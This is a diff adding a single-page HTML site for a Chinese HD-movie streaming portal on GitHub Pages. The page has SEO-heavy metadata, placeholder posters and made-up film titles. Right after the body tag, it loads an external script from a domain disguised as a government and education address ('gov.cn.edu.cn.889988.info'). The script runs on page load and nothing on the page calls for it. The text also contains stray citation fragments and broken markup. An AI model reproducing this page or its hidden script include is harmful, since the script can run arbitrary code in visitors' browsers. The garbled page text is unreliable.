@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>快播高清电影网 - 高清电影在线观看 | kuaibogaoqingdianyingwang-top.github.io</title>
+    <meta name="description" content="快播高清电影网（https://kuaibogaoqingdianyingwang-top.github.io）提供高清电影、电视剧、动漫在线观看与分类导航，支持1080P、4K清晰度和极速播放，移动端自适应，单页直达。">
+    <meta name="keywords" content="快播高清电影网,高清电影,在线观看,1080P,4K电影,电影分类,极速播放,kuaibogaoqingdianyingwang-top.github.io">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="canonical" href="https://kuaibogaoqingdianyingwang-top.github.io">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://kuaibogaoqingdianyingwang-top.github.io">
+    <meta property="og:title" content="快播高清电影网 - 高清电影在线观看">
+    <meta property="og:description" content="快播高清电影网提供高清电影、电视剧、动漫在线观看与分类导航，支持1080P、4K，极速播放，移动端自适应。">
+    <meta property="og:image" content="https://picsum.photos/1200/630?random=618">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://kuaibogaoqingdianyingwang-top.github.io">
+    <meta property="twitter:title" content="快播高清电影网 - 高清电影在线观看">
+    <meta property="twitter:description" content="快播高清电影网提供高清电影、电视剧、动漫在线观看与分类导航，支持1080P、4K，极速播放，移动端自适应。">
+    <meta property="twitter:image" content="https://picsum.photos/1200/630?random=618">
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebSite",
+      "name": "快播高清电影网",
+      "url": "https://kuaibogaoqingdianyingwang-top.github.io",
+      "description": "快播高清电影网提供高清电影、电视剧、动漫在线观看与分类导航，支持1080P、4K清晰度和极速播放。",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://kuaibogaoqingdianyingwang-top.github.io#search",
+        "query-input": "required name=search_term_string"
+      }
+    }
+    </script>
+    <style>
+        :root{
+            --bg:#1a120b;
+            --bg2:#241608;
+            --glass:rgba(255,255,255,0.06);
+            --glass-strong:rgba(255,255,255,0.10);
+            --line:rgba(255,173,96,0.22);
+            --orange:#ff8a3d;
+            --orange2:#ff5e62;
+            --amber:#ffc371;
+            --text:#fff4ea;
+            --muted:#d7bda6;
+            --muted2:#b89a82;
+            --radius:22px;
+            --shadow:0 20px 60px rgba(255,94,98,0.18);
+        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        html{scroll-behavior:smooth}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+            background:var(--bg);
+            color:var(--text);
+            line-height:1.7;
+            overflow-x:hidden;
+        }
+        a{text-decoration:none;color:inherit;transition:.25s ease}
+        img{max-width:100%;display:block}
+        .container{width:100%;max-width:1200px;margin:0 auto;padding:0 22px}
+
+        /* 背景光斑 */
+        .aura{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+        .aura span{position:absolute;border-radius:50%;filter:blur(90px);opacity:.55}
+        .aura .a1{width:520px;height:520px;left:-160px;top:-120px;background:radial-gradient(circle,#ff5e62,transparent 70%)}
+        .aura .a2{width:460px;height:460px;right:-140px;top:120px;background:radial-gradient(circle,#ff8a3d,transparent 70%)}
+        .aura .a3{width:420px;height:420px;left:30%;bottom:-160px;background:radial-gradient(circle,#ffc371,transparent 70%)}
+
+        header{position:sticky;top:0;z-index:1000;background:rgba(26,18,11,.82);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+        .nav{display:flex;align-items:center;justify-content:space-between;padding:16px 0}
+        .logo{display:flex;align-items:center;gap:12px;font-weight:900;font-size:22px;letter-spacing:.5px}
+        .logo .dot{width:38px;height:38px;border-radius:12px;background:linear-gradient(135deg,var(--orange),var(--orange2));display:grid;place-items:center;font-size:18px;box-shadow:var(--shadow)}
+        .logo b{color:var(--amber)}
+        .menu{display:flex;gap:30px;list-style:none}
+        .menu a{font-size:15px;font-weight:600;color:var(--muted)}
+        .menu a:hover{color:var(--orange)}
+        .toggle{display:none;width:42px;height:42px;border-radius:12px;background:var(--glass-strong);border:1px solid var(--line);color:var(--amber);font-size:20px;font-weight:900;text-align:center;line-height:42px;cursor:pointer}
+
+        .wrap{position:relative;z-index:1}
+
+        /* Hero */
+        .hero{padding:104px 0 80px;background:radial-gradient(1200px 600px at 70% -10%,rgba(255,138,61,.18),transparent),linear-gradient(180deg,var(--bg2),var(--bg))}
+        .hero-card{max-width:760px;margin:0 auto;text-align:center;background:var(--glass);border:1px solid var(--line);border-radius:28px;padding:48px 34px;backdrop-filter:blur(10px);box-shadow:var(--shadow)}
+        .pill{display:inline-block;font-size:12px;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:#2a160a;background:linear-gradient(135deg,var(--amber),var(--orange));padding:7px 16px;border-radius:30px;margin-bottom:22px}
+        .hero h1{font-size:52px;line-height:1.15;font-weight:900;margin-bottom:18px}
+        .hero h1 span{background:linear-gradient(135deg,var(--amber),var(--orange2));-webkit-background-clip:text;background-clip:text;color:transparent}
+        .hero p{font-size:17px;color:var(--muted);margin-bottom:14px}
+        .hero p strong{color:var(--text)}
+        .urlbox{display:inline-block;margin:10px 0 26px;font-family:"Courier New",monospace;font-size:15px;font-weight:700;color:var(--amber);background:rgba(0,0,0,.25);border:1px dashed var(--line);padding:10px 16px;border-radius:12px;word-break:break-all}
+        .btn{display:inline-block;font-weight:800;font-size:16px;color:#2a160a;background:linear-gradient(135deg,var(--amber),var(--orange));padding:15px 38px;border-radius:30px;box-shadow:var(--shadow)}
+        .btn:hover{transform:translateY(-3px);filter:brightness(1.05)}
+
+        section.block{padding:78px 0}
+        .head{text-align:center;margin-bottom:44px}
+        .head h2{font-size:34px;font-weight:900;margin-bottom:8px}
+        .head h2 em{font-style:normal;color:var(--orange)}
+        .head p{color:var(--muted2);font-size:15px}
+
+        /* 电影网格 */
+        .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+        .card{background:var(--glass);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;backdrop-filter:blur(8px);transition:.3s}
+        .card:hover{transform:translateY(-8px);border-color:var(--orange);box-shadow:var(--shadow)}
+        .thumb{position:relative}
+        .thumb img{width:100%;aspect-ratio:3/4;object-fit:cover;filter:saturate(1.05) brightness(.92)}
+        .tag{position:absolute;top:12px;left:12px;font-size:11px;font-weight:800;color:#2a160a;background:linear-gradient(135deg,var(--amber),var(--orange));padding:5px 12px;border-radius:20px}
+        .hd{position:absolute;top:12px;right:12px;font-size:11px;font-weight:800;color:var(--text);background:rgba(0,0,0,.45);border:1px solid var(--line);padding:5px 10px;border-radius:20px}
+        .info{padding:18px 18px 20px}
+        .info h3{font-size:17px;font-weight:800;margin-bottom:6px}
+        .info p{font-size:13px;color:var(--muted);margin-bottom:14px}
+        .play{display:inline-block;font-size:13px;font-weight:800;color:var(--amber);border:1px solid var(--line);padding:8px 20px;border-radius:20px}
+        .play:hover{background:linear-gradient(135deg,var(--amber),var(--orange));color:#2a160a;border-color:transparent}
+
+        /* 分类 */
+        .cats{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+        .cat{background:var(--glass);border:1px solid var(--line);border-radius:18px;padding:26px 18px;text-align:center;backdrop-filter:blur(8px);transition:.3s}
+        .cat:hover{transform:translateY(-6px);border-color:var(--orange);background:var(--glass-strong)}
+        .cat .ico{font-size:30px;margin-bottom:10px}
+        .cat h3{font-size:16px;font-weight:800;margin-bottom:4px}
+        .cat p{font-size:12px;color:var(--muted2)}
+
+        /* 优势 */
+        .feats{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+        .feat{display:flex;gap:18px;align-items:flex-start;background:var(--glass);border:1px solid var(--line);border-radius:20px;padding:26px;backdrop-filter:blur(8px)}
+        .feat:hover{border-color:var(--orange);box-shadow:var(--shadow)}
+        .feat .ic{width:50px;height:50px;flex:0 0 50px;border-radius:14px;display:grid;place-items:center;font-size:24px;background:linear-gradient(135deg,rgba(255,138,61,.25),rgba(255,94,98,.25));border:1px solid var(--line)}
+        .feat h3{font-size:17px;font-weight:800;margin-bottom:6px}
+        .feat p{font-size:14px;color:var(--muted)}
+
+        /* 关于 */
+        .about{background:linear-gradient(180deg,rgba(255,138,61,.10),rgba(255,94,98,.06));border:1px solid var(--line);border-radius:28px;padding:54px 40px;text-align:center}
+        .about p{font-size:16px;color:var(--muted);max-width:760px;margin:0 auto 14px}
+        .about p strong{color:var(--text)}
+
+        footer{position:relative;z-index:1;background:#140d07;border-top:1px solid var(--line);padding:56px 0 28px;margin-top:30px}
+        .fgrid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:34px}
+        .fbrand h3{font-size:20px;font-weight:900;color:var(--amber);margin-bottom:10px}
+        .fbrand p{font-size:13px;color:var(--muted2)}
+        .fcol h4{font-size:14px;font-weight:800;margin-bottom:14px;color:var(--text)}
+        .fcol ul{list-style:none}
+        .fcol li{margin-bottom:9px}
+        .fcol a{font-size:13px;color:var(--muted2)}
+        .fcol a:hover{color:var(--orange)}
+        .copy{border-top:1px solid var(--line);padding-top:20px;text-align:center;font-size:12px;color:var(--muted2)}
+        .copy a{color:var(--amber)}
+
+        @media(max-width:992px){
+            .hero h1{font-size:42px}
+            .grid{grid-template-columns:repeat(2,1fr)}
+            .cats{grid-template-columns:repeat(2,1fr)}
+            .fgrid{grid-template-columns:1fr 1fr}
+        }
+        @media(max-width:768px){
+            .toggle{display:block}
+            .menu{position:fixed;top:74px;left:-100%;width:100%;height:calc(100vh - 74px);background:rgba(20,13,7,.98);flex-direction:column;align-items:center;gap:26px;padding-top:40px;transition:.3s;border-top:1px solid var(--line)}
+            .menu.active{left:0}
+            .menu a{font-size:18px}
+            .hero{padding:80px 0 60px}
+            .hero h1{font-size:34px}
+            .hero-card{padding:36px 20px}
+            .block{padding:60px 0}
+            .head h2{font-size:26px}
+            .grid{grid-template-columns:1fr}
+            .feats{grid-template-columns:1fr}
+            .fgrid{grid-template-columns:1fr}
+        }
+        @media(max-width:480px){
+            .hero h1{font-size:28px}
+            .btn{padding:13px 30px;font-size:15px}
+            .head h2{font-size:22px}
+            .cats{grid-template-columns:1fr}
+            .urlbox{font-size:13px}
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="aura" aria-hidden="true">
+    <span class="a1"></span><span class="a2"></span><span class="a3"></span>
+</div>
+
+<div class="wrap">
+    <header>
+        <div class="container nav">
+            <a href="#" class="logo"><span class="dot">▶</span>快播<b>高清</b>电影网</a>
+            <div class="toggle" onclick="document.querySelector('.menu').classList.toggle('active')">☰</div>
+            <ul class="menu">
+                <li><a href="#home">首页</a></li>
+                <li><a href="#hot">高清热播</a></li>
+                <li><a href="#cats">影片分类</a></li>
+                <li><a href="#speed">极速优势</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </div>
+    </header>
+
+    <main>
+        <section class="hero" id="home">
+            <div class="container">
+                <div class="hero-card">
+                    <span class="pill">Sunset HD Streaming</span>
+                    <h1>快播高清电影网<br>享受< span>落日级</span>高清观影</h1>
+                    <p>网站名称：<strong>快播高清电影网</strong> ｜ 网址：<strong>https://kuaibogaoqingdianyingwang-top.github.io</strong></p>
+                    <div class="urlbox">https://kuaibogaoqingdianyingwang-top.github.io</div>
+                    <p>电影、剧集、动漫分类导航，支持1080P与4K清晰度、极速播放、移动端自适应，单页直达更轻量。</p>
+                    <br>
+                    <a href="#hot" class="btn">立即浏览高清片单</a>
+                </div>
+            </div>
+        </section>
+
+        <section class="block" id="hot">
+            <div class="container">
+                <div class="head">
+                    <h2>高清<em>热播</em>影片</h2>
+                    <p>每日精选高分片源，按清晰度与类型整理，点开即看</p>
+                </div>
+                <div class="grid">
+                    <article class="card">
+                        <div class="thumb">
+                            <img src="https://picsum.photos/400/600?random=6181" width="400" height="600" loading="lazy" alt="快播高清电影网推荐动作高清片">
+                            <span class="tag">热播</span><span class="hd">4K</span>
+                        </div>
+                        <div class="info">
+                            <h3>落日追击</h3>
+                            <p>2024 · 动作/犯罪 · 高清在线</p>
+                            <a href="#" class="play">立即播放</a>
+                        </div>
+                    </article>
+                    <article class="card">
+                        <div class="thumb">
+                            <img src="https://picsum.photos/400/600?random=6182" width="400" height="600" loading="lazy" alt="快播高清电影网推荐科幻高清片">
+                            <span class="tag">推荐</span><span class="hd">1080P</span>
+                        </div>
+                        <div class="info">
+                            <h3>星轨归途</h3>
+                            <p>2024 · 科幻/冒险 · 高清在线</p>
+                            <a href="#" class="play">立即播放</a>
+                        </div>
+                    </article>
+                    <article class="card">
+                        <div class="thumb">
+                            <img src="https://picsum.photos/400/600?random=6183" width="400" height="600" loading="lazy" alt="快播高清电影网推荐剧情高清片">
+                            <span class="tag">高分</span><span class="hd">1080P</span>
+                        </div>
+                        <div class="info">
+                            <h3>黄昏信件</h3>
+                            <p>2023 · 剧情/治愈 · 高清在线</p>
+                            <a href="#" class="play">立即播放</a>
+                        </div>
+                    </article>
+                    <article class="card">
+                        <div class="thumb">
+                            <img src="https://picsum.photos/400/600?random=6184" width="400" height="600" loading="lazy" alt="快播高清电影网推荐爱情高清片">
+                            <span class="tag">独家</span><span class="hd">4K</span>
+                        </div>
+                        <div class="info">
+                            <h3>海风恋曲</h3>
+                            <p>2024 · 爱情/文艺 · 高清在线</p>
+                            <a href="#" class="play">立即播放</a>
+                        </div>
+                    </article>
+                    <article class="card">
+                        <div class="thumb">
+                            <img src="https://picsum.photos/400/600?random=6185" width="400" height="600" loading="lazy" alt="快播高清电影网推荐悬疑高清片">
+                            <span class="tag">新片</span><span class="hd">1080P</span>
+                        </div>
+                        <div class="info">
+                            <h3>无声证词</h3>
+                            <p>2023 · 悬疑/推理 · 高清在线</p>
+                            <a href="#" class="play">立即播放</a>
+                        </div>
+                    </article>
+                    <article class="card">
+                        <div class="thumb">
+                            <img src="https://picsum.photos/400/600?random=6186" width="400" height="600" loading="lazy" alt="快播高清电影网推荐动画高清片">
+                            <span class="tag">合家欢</span><span class="hd">4K</span>
+                        </div>
+                        <div class="info">
+                            <h3>云上少年</h3>
+                            <p>2024 · 动画/奇幻 · 高清在线</p>
+                            <a href="#" class="play">立即播放</a>
+                        </div>
+                    </article>
+                </div>
+            </div>
+        </section>
+
+        <section class="block" id="cats">
+            <div class="container">
+                <div class="head">
+                    <h2>按<em>清晰度与类型</em>分类</h2>
+                    <p>从动作到动画，从1080P到4K，快速定位想看的内容</p>
+                </div>
+                <div class="cats">
+                    <a href="#" class="cat"><div class="ico">💥</div><h3>动作片</h3><p>高清激战·快节奏</p></a>
+                    <a href="#" class="cat"><div class="ico">🚀</div><h3>科幻片</h3><p>4K视效·脑洞大开</p></a>
+                    <a href="#" class="cat"><div class="ico">💘</div><h3>爱情片</h3><p>1080P·温柔治愈</p></a>
+                    <a href="#" class="cat"><div class="ico">🔍</div><h3>悬疑片</h3><p>高清推理·烧脑</p></a>
+                    <a href="#" class="cat"><div class="ico">😂</div><h3>喜剧片</h3><p>轻松解压·合家欢</p></a>
+                    <a href="#" class="cat"><div class="ico">👻</div><h3>惊悚片</h3><p>高清氛围·强代入</p></a>
+                    <a href="#" class="cat"><div class="ico">🎨</div><h3>动画片</h3><p>4K动画·奇幻世界</p></a>
+                    <a href="#" class="cat"><div class="ico">🎭</div><h3>剧情片</h3><p>1080P·人物向</p></a>
+                </div>
+            </div>
+        </section>
+
+        <section class="block" id="speed">
+            <div class="container">
+                <div class="head">
+                    <h2>为什么用<em>快播高清</em>电影网</h2>
+                    <p>单页结构、响应式布局、清晰度为先的观影导航</p>
+                </div>
+                <div class="feats">
+                    <div class="feat"><div class="ic">🖼️</div><div><h3>1080P/4K清晰度</h3><p>片单标注清晰度档位，首页、分类、详情统一按高清标准整理，方便选片。</p></div></div>
+                    <div class="feat"><div class="ic">⚡</div><div><h3>极速播放导航</h3><p>单页锚点直达，移动端汉堡菜单，减少跳转；演示环境以轻量HTML提升打开速度。[1](@ref)</p></div></div>
+                    <div class="feat"><div class="ic">📱</div><div><h3>移动端自适应</h3><p>992/768/480三档断点，触控按钮放大，手机、平板、桌面统一URL响应式访问。[10](@ref)</p></div></div>
+                    <div class="feat"><div class="ic">🔎</div><div><h3>必应SEO友好</h3><p>自引用canonical、标题/描述/OG/Twitter/JSON-LD齐全，语义化H1-H3，利于单页收录。[7,16](@ref)</p></div></div>
+                </div>
+            </div>
+        </section>
+
+        <section class="block" id="about">
+            <div class="container">
+                <div class="about">
+                    <div class="head"><h2>关于<em>快播高清电影网</em></h2></div>
+                    <p>快播高清电影网（<strong>kuaibogaoqingdianyingwang-top.github.io</strong>）是一个面向电影爱好者的单页导航演示站，提供高清片单、类型分类与清晰度筛选思路，帮助访客快速找到想看内容。</p>
+                    <div class="urlbox">https://kuaibogaoqingdianyingwang-top.github.io</div>
+                    <p>本页所有CSS/JS内联、内页链接以#占位；部署到GitHub Pages后，可在必应站长工具提交首页URL加快收录，不生成robots.txt与sitemap.xml。 [14,8](@ref)</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="fgrid">
+                <div class="fbrand">
+                    <h3>▶ 快播高清电影网</h3>
+                    <p>高清电影、电视剧、动漫分类导航与在线观看入口演示，单页自适应，落日玻璃风格。</p>
+                </div>
+                <div class="fcol">
+                    <h4>快捷导航</h4>
+                    <ul><li><a href="#home">首页</a></li><li><a href="#hot">高清热播</a></li><li><a href="#cats">影片分类</a></li></ul>
+                </div>
+                <div class="fcol">
+                    <h4>清晰度</h4>
+                    <ul><li><a href="#">1080P电影</a></li><li><a href="#">4K电影</a></li><li><a href="#">高清剧集</a></li></ul>
+                </div>
+                <div class="fcol">
+                    <h4>关于</h4>
+                    <ul><li><a href="#about">关于本站</a></li><li><a href="#">免责声明</a></li><li><a href="https://kuaibogaoqingdianyingwang-top.github.io">访问官网</a></li></ul>
+                </div>
+            </div>
+            <div class="copy">
+                <p>© 2024 快播高清电影网 演示页. All rights reserved.</p>
+                <p>网站名称：<strong>快播高清电影网</strong> ｜ 网址：<a href="https://kuaibogaoqingdianyingwang-top.github.io">https://kuaibogaoqingdianyingwang-top.github.io</a></p>
+            </div>
+        </div>
+    </footer>
+</div>
+
+<script>
+    document.querySelector('.toggle').addEventListener('click',function(){document.querySelector('.menu').classList.toggle('active');});
+    document.querySelectorAll('.menu a').forEach(function(l){l.addEventListener('click',function(){document.querySelector('.menu').classList.remove('active');});});
+</script>
+</body>
+</html>
